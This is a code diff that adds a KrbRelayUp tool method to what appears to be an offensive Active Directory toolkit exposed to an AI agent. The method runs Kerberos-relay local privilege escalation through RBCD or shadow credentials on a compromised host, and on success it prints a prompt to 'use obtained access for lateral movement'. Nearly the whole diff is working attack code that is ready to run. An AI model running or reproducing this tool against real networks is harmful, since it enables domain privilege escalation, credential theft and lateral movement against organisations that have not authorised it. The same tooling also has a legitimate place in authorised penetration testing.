@@ -908,6 +908,66 @@ class DelegationTools(Toolset):
         except Exception as e:
             return f"Coercion for unconstrained delegation failed: {e}"
 
+    @dn.tool_method
+    def krbrelayup(
+        self,
+        domain: str,
+        dc_ip: str,
+        method: str = "rbcd",
+        create_user: str | None = None,
+        create_password: str | None = None,
+    ) -> str:
+        """
+        Local privilege escalation via Kerberos relay (KrbRelayUp).
+
+        Relays Kerberos authentication from a local service to LDAP for
+        RBCD or shadow credentials attack. Requires running on a compromised
+        host with a service that performs Kerberos authentication.
+
+        This is a LOCAL privilege escalation technique - run it ON the target
+        machine, not remotely.
+
+        Args:
+            domain: Target domain (e.g., 'contoso.local')
+            dc_ip: Domain controller IP address
+            method: Attack method - 'rbcd' (default) or 'shadowcred'
+            create_user: Computer account name to create (optional)
+            create_password: Password for created computer account (optional)
+
+        Returns:
+            KrbRelayUp result including credentials if successful
+
+        Example:
+            >>> krbrelayup("contoso.local", "192.168.58.10")
+            >>> krbrelayup("contoso.local", "192.168.58.10", method="shadowcred")
+        """
+        cmd = ["KrbRelayUp", "full", "-m", method, "-d", domain, "-dc", dc_ip]
+
+        if create_user:
+            cmd.extend(["-cn", create_user])
+        if create_password:
+            cmd.extend(["-cp", create_password])
+
+        try:
+            logger.info(f"[*] Running KrbRelayUp ({method}) against {domain}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=300)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or "success" in result.lower():
+                logger.warning(f"[+] KrbRelayUp successful via {method}!")
+                result = (
+                    f"🚨 KRBRELAYUP SUCCESSFUL!\n"
+                    f"→ Local privesc via {method}\n"
+                    "→ Check output for credentials/tickets\n"
+                    "→ Use obtained access for lateral movement\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"KrbRelayUp failed: {e}"
+
 
 class CertipyTools(Toolset):
     """Tools for AD Certificate Services (ADCS) enumeration and exploitation.
